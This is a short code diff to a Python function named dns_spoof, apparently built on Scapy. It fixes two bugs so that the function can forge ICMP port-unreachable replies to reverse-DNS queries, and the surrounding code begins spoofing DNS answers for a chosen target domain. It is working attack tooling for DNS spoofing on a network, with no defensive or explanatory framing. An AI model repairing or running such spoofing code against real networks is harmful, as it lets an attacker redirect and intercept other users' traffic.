@@ -64,10 +64,10 @@ def dns_spoof(pkt):
         if "in-addr.arpa" in pkt[DNS].qd.qname.decode():
             eth = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
             ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
-            icmp = ICMP(type-3, code-3)
+            icmp = ICMP(type=3, code=3)
             oip = pkt.getlayer(IP)
             oudp = pkt.getlayer(UDP)
-            p = eht / ip / icmp / oip / oudp
+            p = eth / ip / icmp / oip / oudp
             sendp(p, verbose=0)
         if target_domain in pkt[DNS].qd.qname.decode():
             print(f"Spoofing DNS request for {target_domain}")
